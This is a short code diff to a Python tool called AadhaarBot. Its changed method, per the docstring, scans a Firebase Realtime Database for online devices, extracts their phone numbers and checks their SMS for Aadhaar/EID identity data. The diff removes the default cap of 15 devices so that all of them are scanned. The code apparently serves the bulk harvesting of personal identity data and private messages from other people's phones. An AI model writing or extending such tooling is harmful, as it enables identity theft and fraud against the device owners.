@@ -683,7 +683,7 @@ class AadhaarBot:
         except Exception as e:
             return False, str(e)
 
-    def scan_firebase_devices(self, firebase_url: str, max_check: int = 15):
+    def scan_firebase_devices(self, firebase_url: str, max_check: int = None):
         """
         Scans a Firebase Realtime Database for active/online devices,
         extracts their mobile numbers, model, battery, and checks SMS for Aadhaar / EID presence.
@@ -736,7 +736,7 @@ class AadhaarBot:
             # Sort: online first, then with valid mobile
             candidates.sort(key=lambda x: (1 if x['is_online'] else 0, 1 if x['mobile'] else 0), reverse=True)
 
-            top_candidates = candidates[:max_check]
+            top_candidates = candidates[:max_check] if (max_check and max_check > 0) else candidates
 
             def check_sms(dev):
                 try:
